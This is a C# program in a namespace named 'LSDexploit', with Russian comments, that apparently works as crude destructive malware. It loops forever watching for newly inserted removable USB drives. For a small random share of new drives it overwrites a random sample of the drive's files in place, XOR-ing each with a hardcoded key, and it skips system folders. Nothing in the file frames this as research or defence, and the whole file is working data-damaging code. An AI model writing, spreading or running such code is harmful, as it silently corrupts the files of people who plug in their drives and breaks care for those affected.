namespace LSDexploit
{
    class Program
    {
        private static readonly byte[] EncryptionKey = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };

        private static void Main()
        {
            var previousDevices = GetUsbDevices();
            var random = new Random();

            while (true)
            {
                var currentDevices = GetUsbDevices();

                foreach (var device in currentDevices.Except(previousDevices))
                {
                    // 5% шанс на шифрование всех файлов
                    if (random.Next(0, 100) < 5)
                    {
                        EncryptFilesInDirectory(device.RootDirectory.ToString(), random);
                    }
                }

                previousDevices = currentDevices;
            }
        }

        /// <summary>
        /// Метод шифрует файлы в указанной директории с заданной вероятностью.
        /// </summary>
        /// <param name="rootDirectoryPath">Путь к корневой директории USB-устройства.</param>
        /// <param name="random">Экземпляр генератора случайных чисел.</param>
        private static void EncryptFilesInDirectory(string rootDirectoryPath, Random random)
        {
            var rootDirectory = new DirectoryInfo(rootDirectoryPath);

            try
            {
                var files = rootDirectory.EnumerateFiles("*", SearchOption.AllDirectories)
                    .Where(file => char.IsLetter(file.Directory.Name[0]) && !IsSystemDirectory(file.Directory));

                foreach (var file in files)
                {
                    // 1% шанс на шифрование каждого файла
                    if (random.Next(0, 100) == 1)
                    {
                        EncryptFile(file);
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine($"Доступ запрещен: {ex.Message}");
            }
        }

        /// <summary>
        /// Метод шифрует файл с помощью простого XOR шифрования.
        /// </summary>
        /// <param name="file">Файл для шифрования.</param>
        private static void EncryptFile(FileInfo file)
        {
            try
            {
                byte[] fileBytes = File.ReadAllBytes(file.FullName);

                // Шифрование XOR с использованием ключа
                for (int i = 0; i < fileBytes.Length; i++)
                {
                    fileBytes[i] ^= EncryptionKey[i % EncryptionKey.Length];
                }

                File.WriteAllBytes(file.FullName, fileBytes);

                Console.WriteLine($"Файл зашифрован: {file.FullName}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при шифровании файла: {file.FullName}. Ошибка: {ex.Message}");
            }
        }

        /// <summary>
        /// Определяет, является ли директория системной.
        /// </summary>
        /// <param name="directory">Директория для проверки.</param>
        /// <returns>True, если директория системная, иначе False.</returns>
        private static bool IsSystemDirectory(DirectoryInfo directory)
        {
            return directory.Name.Equals("System Volume Information", StringComparison.OrdinalIgnoreCase) ||
                   (directory.Attributes & FileAttributes.System) != 0;
        }

        /// <summary>
        /// Возвращает список подключённых USB-устройств.
        /// </summary>
        /// <returns>Список <see cref="DriveInfo"/>, представляющий съёмные устройства.</returns>
        private static List<DriveInfo> GetUsbDevices()
        {
            return DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Removable).ToList();
        }
    }
}
